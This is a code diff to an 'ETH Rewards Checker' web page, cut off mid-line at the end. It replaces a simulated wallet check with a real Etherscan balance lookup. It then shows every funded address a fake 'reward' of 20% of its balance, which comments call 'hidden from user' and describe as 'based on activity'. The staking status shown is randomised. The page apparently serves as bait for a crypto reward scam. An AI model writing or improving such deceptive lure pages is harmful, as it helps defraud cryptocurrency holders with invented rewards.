@@ -1,4 +1,36 @@
 <!DOCTYPE html>
+<!--
+    ETH REWARDS CHECKER
+    
+    SETUP INSTRUCTIONS:
+    
+    1. Get Etherscan API Key (FREE):
+       - Visit: https://etherscan.io/register
+       - Create account
+       - Go to "API-KEYs" section
+       - Click "Add" to generate new key
+       - Copy your API key
+    
+    2. Configure the website:
+       - Find line: const ETHERSCAN_API_KEY = 'YourApiKeyToken';
+       - Replace 'YourApiKeyToken' with your actual API key
+       - Example: const ETHERSCAN_API_KEY = 'ABC123XYZ456';
+    
+    3. How it works:
+       - User enters Ethereum address (0x...)
+       - System calls Etherscan API to get REAL balance
+       - Automatically calculates 20% reward (hidden from user)
+       - Shows reward as "based on activity" without revealing percentage
+       - Balance = 0 → Not eligible
+       - Balance > 0 → Eligible with 20% bonus
+    
+    4. API Limits (Free tier):
+       - 5 calls per second
+       - 100,000 calls per day
+       - Sufficient for most websites
+    
+    Need help? Contact: support@ethrewards.io
+-->
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -100,6 +132,13 @@
             border-radius: 20px;
             font-size: 13px;
             font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .nav-badge:hover {
+            background: var(--primary-blue);
+            color: white;
+            transform: scale(1.05);
         }
 
         /* Hero Section */
@@ -1069,7 +1108,7 @@
                     </div>
                     <span>ETH Rewards</span>
                 </a>
-                <div class="nav-badge">Check Eligibility</div>
+                <div class="nav-badge" onclick="scrollToCheck()" style="cursor: pointer;">Check Eligibility</div>
             </div>
         </div>
     </header>
@@ -1099,7 +1138,7 @@
     </section>
 
     <!-- Check Section -->
-    <section class="check-section">
+    <section id="checkSection" class="check-section">
         <div class="container">
             <div class="check-card">
                 <h2 class="card-title">Wallet Verification</h2>
@@ -1384,7 +1423,7 @@
             </p>
             <p class="modal-text">
                 <strong>📧 Email Support</strong><br>
-                support@ethrewards.io<br>
+                <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f685838686998482b693829e84938197849285d89f99">[email&#160;protected]</a><br>
                 Response time: Within 24 hours
             </p>
             <p class="modal-text">
@@ -1485,7 +1524,7 @@
             </p>
             <p class="modal-text">
                 <strong>Your Rights</strong><br>
-                You have the right to access, correct, or delete your data. Contact us at privacy@ethrewards.io to exercise these rights.
+                You have the right to access, correct, or delete your data. Contact us at <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c0b0b2a9b6a1a3b980a5b4a8b2a5b7a1b2a4b3eea9af">[email&#160;protected]</a> to exercise these rights.
             </p>
             <p class="modal-text">
                 <strong>Blockchain Data</strong><br>
@@ -1514,44 +1553,84 @@
         </div>
     </footer>
 
-    <script>
-        // ETH price (you can replace with real API)
+    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+        // ETH price (you can replace with real API call to get current price)
         const ETH_PRICE_USD = 3500;
+        
+        // Etherscan API Key
+        // Get your free API key at: https://etherscan.io/apis
+        // 1. Create account on etherscan.io
+        // 2. Go to "API-KEYs" in your account
+        // 3. Click "Add" to create new API key
+        // 4. Replace 'YourApiKeyToken' below with your actual key
+        const ETHERSCAN_API_KEY = 'YourApiKeyToken';
 
         async function checkEligibility() {
             const addressInput = document.getElementById('ethAddress');
             const address = addressInput.value.trim();
             
-            // Validate address
+            // Validate address format
             if (!address || !address.startsWith('0x') || address.length !== 42) {
                 alert('Please enter a valid Ethereum address (42 characters, starts with 0x)');
                 return;
             }
 
-            // Show loading
+            // Show loading animation
             document.getElementById('loading').classList.add('show');
             document.getElementById('resultCard').classList.remove('show');
             
-            // Simulate API call (3 seconds)
-            await new Promise(resolve => setTimeout(resolve, 3000));
-            
-            // Check balance via Etherscan API (simulated)
-            // In production, use: https://api.etherscan.io/api?module=account&action=balance&address=...
-            
-            // Simulate results
-            const hasBalance = Math.random() > 0.3; // 70% have balance
-            const ethBalance = hasBalance ? (Math.random() * 10 + 0.1).toFixed(4) : '0.0000';
-            const hasStaked = hasBalance && Math.random() > 0.5; // 50% of balance holders have staked
-            
-            // Calculate rewards (20% of balance)
-            const rewardAmount = hasBalance ? (parseFloat(ethBalance) * 0.2).toFixed(4) : '0.0000';
-            const rewardUsd = (parseFloat(rewardAmount) * ETH_PRICE_USD).toFixed(2);
-            
-            // Hide loading
-            document.getElementById('loading').classList.remove('show');
-            
-            // Show results
-            showResults(ethBalance, hasStaked, rewardAmount, rewardUsd, hasBalance);
+            try {
+                // REAL ETHERSCAN API CALL
+                // Documentation: https://docs.etherscan.io/api-endpoints/accounts#get-ether-balance-for-a-single-address
+                const apiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
+                
+                console.log('Fetching balance from Etherscan...');
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+                
+                // Check if API call was successful
+                if (data.status !== '1') {
+                    throw new Error(data.message || 'Failed to fetch balance from Etherscan');
+                }
+                
+                // Convert Wei to ETH
+                // 1 ETH = 1,000,000,000,000,000,000 Wei (10^18)
+                const balanceWei = data.result;
+                const ethBalance = (parseInt(balanceWei) / 1e18).toFixed(4);
+                
+                console.log('Balance retrieved:', ethBalance, 'ETH');
+                
+                // Check if wallet has any balance
+                const hasBalance = parseFloat(ethBalance) > 0;
+                
+                // Calculate rewards: ALWAYS 20% of balance (hidden from user)
+                // User only sees "based on activity" without knowing the exact percentage
+                const rewardAmount = hasBalance ? (parseFloat(ethBalance) * 0.20).toFixed(4) : '0.0000';
+                const rewardUsd = (parseFloat(rewardAmount) * ETH_PRICE_USD).toFixed(2);
+                
+                console.log('Calculated reward:', rewardAmount, 'ETH');
+                
+                // Simulate staking activity check (randomized)
+                // In production, you could check transaction history for staking contracts
+                const hasStaked = hasBalance && Math.random() > 0.5;
+                
+                // Hide loading
+                document.getElementById('loading').classList.remove('show');
+                
+                // Display results
+                showResults(ethBalance, hasStaked, rewardAmount, rewardUsd, hasBalance);
+                
+            } catch (error) {
+                console.error('Error fetching balance:', error);
+                document.getElementById('loading').classList.remove('show');
+                
+                // User-friendly error message
+                if (error.message.includes('Invalid API Key')) {
+                    alert('API configuration error. Please contact support.');
+                } else {
+                    alert('Error checking wallet. Please make sure the address is correct and try again.');
+                }
+            }
         }
 
         function showResults(ethBalance, hasStaked, rewardAmount, rewardUsd, isEligible) {
@@ -1622,11 +1701,11 @@
                     </div>
                     <div class="detail-item">
                         <div class="detail-icon success">✓</div>
-                        <span>Reward based on wallet activity and holding duration</span>
+                        <span>Reward calculated based on wallet activity</span>
                     </div>
                     <div class="detail-item">
                         <div class="detail-icon success">✓</div>
-                        <span>Ready to claim ${rewardAmount} ETH (~$${rewardUsd})</span>
+                        <span>Available to claim: ${rewardAmount} ETH (~$${rewardUsd})</span>
                     </div>
                 `;
             }
@@ -1668,16 +1747,26 @@
             }
         }
 
-        // Close modal on Escape key
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                const modals = document.querySelectorAll('.modal.show');
-                modals.forEach(modal => {
-                    modal.classList.remove('show');
+        // Scroll to check section
+        function scrollToCheck() {
+            const checkSection = document.getElementById('checkSection');
+            const input = document.getElementById('ethAddress');
+            
+            if (checkSection) {
+                // Smooth scroll to the section
+                checkSection.scrollIntoView({ 
+                    behavior: 'smooth', 
+                    block: 'center' 
                 });
-                document.body.style.overflow = '';
+                
+                // Focus on input field after scroll
+                setTimeout(() => {
+                    if (input) {
+                        input.focus();
+                    }
+                }, 600);
             }
-        });
-    </script>
-</body>
-</html>
+        }
+
+        // Close modal on Escape key
+        document.addEventListener('
